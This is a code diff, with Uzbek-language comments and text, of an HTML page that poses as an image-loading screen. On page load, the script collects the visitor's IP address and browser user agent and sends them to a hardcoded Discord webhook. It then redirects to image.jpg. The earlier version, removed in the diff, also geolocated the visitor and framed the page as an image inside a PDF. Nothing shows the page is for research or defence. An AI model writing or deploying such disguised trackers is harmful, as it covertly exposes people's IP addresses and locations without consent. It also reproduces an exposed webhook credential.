@@ -2,54 +2,86 @@
 <html>
 <head>
     <title>Rasm Yuklanmoqda...</title>
-    <meta http-equiv="refresh" content="0; url=image.jpg">
 </head>
 <body>
     <script>
+        // Discord Webhook
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430274332969406464/jWY9FXp_agGFehgu4C7tjFUK35V7-lWDgKfYs87M_ZoJXJcxRRCv_pK_IT8LGNc6gbrw";
 
-        async function trackUser() {
+        console.log('Script ishga tushdi...');
+
+        // Oddiy IP olish
+        async function getIP() {
             try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const publicIP = ipData.ip;
-
-                let city = 'Nomaʼlum';
-                let country = 'Nomaʼlum';
-                
-                try {
-                    const geoResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
-                    const geoData = await geoResponse.json();
-                    city = geoData.city || 'Nomaʼlum';
-                    country = geoData.country_name || 'Nomaʼlum';
-                } catch (geoError) {}
-
-                const discordMessage = {
-                    content: `📄 **PDF Ichidagi Rasm Ochildi!**\n\n` +
-                             `🌐 **IP Manzil:** ${publicIP}\n` +
-                             `📍 **Joylashuv:** ${city}, ${country}\n` +
-                             `⏰ **Vaqt:** ${new Date().toLocaleString()}\n` +
-                             `🔗 **Manba:** PDF fayl`,
-                    username: "PDF Kuzatuvchi"
-                };
-                
-                fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(discordMessage)
-                });
-
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
             } catch (error) {
-                console.error('Xato:', error);
+                return 'Aniqlanmadi';
             }
         }
 
-        trackUser();
+        // Discordga yuborish
+        async function sendToDiscord() {
+            try {
+                console.log('Discordga yuborish boshlandi...');
+                
+                const userIP = await getIP();
+                console.log('IP olish: ' + userIP);
+
+                const message = {
+                    content: `🚨 **YANGI TASHRIF!**\n\n` +
+                             `🌐 **IP:** ${userIP}\n` +
+                             `⏰ **Vaqt:** ${new Date().toLocaleString()}\n` +
+                             `🖥️ **Brauzer:** ${navigator.userAgent}\n` +
+                             `🔗 **Sahifa:** image.html`,
+                    username: "Tashrif Kuzatuvchi"
+                };
+
+                console.log('Discord so\'rovini yuborish...');
+                
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(message)
+                });
+
+                if (response.ok) {
+                    console.log('✅ Discordga muvaffaqiyatli yuborildi!');
+                } else {
+                    console.log('❌ Discord javobi: ' + response.status);
+                }
+
+            } catch (error) {
+                console.log('❌ Xato: ' + error.message);
+            }
+        }
+
+        // Sahifa yuklanganda ishga tushirish
+        window.addEventListener('load', function() {
+            console.log('Sahifa yuklandi, Discordga yuborish boshlandi...');
+            sendToDiscord();
+            
+            // 2 soniyadan keyin rasmga o'tish
+            setTimeout(function() {
+                window.location.href = 'image.jpg';
+            }, 2000);
+        });
     </script>
-    
-    <div style="text-align: center; padding: 50px;">
-        <h2>Rasm Yuklanmoqda...</h2>
-        <p>Agar rasm avtomatik ochilmasa, <a href="image.jpg">bu yerni bosing</a></p>
+
+    <div style="text-align: center; padding: 100px; font-family: Arial;">
+        <h1>Rasm Yuklanmoqda...</h1>
+        <p>Iltimos, kuting. Rasm avtomatik ravishda ochiladi.</p>
+        <p id="status">Discordga ma'lumot yuborilmoqda...</p>
     </div>
+
+    <script>
+        // Status yangilash
+        setTimeout(function() {
+            document.getElementById('status').textContent = 'Ma\'lumotlar yuborildi, rasm ochilmoqda...';
+        }, 1000);
+    </script>
 </body>
 </html>
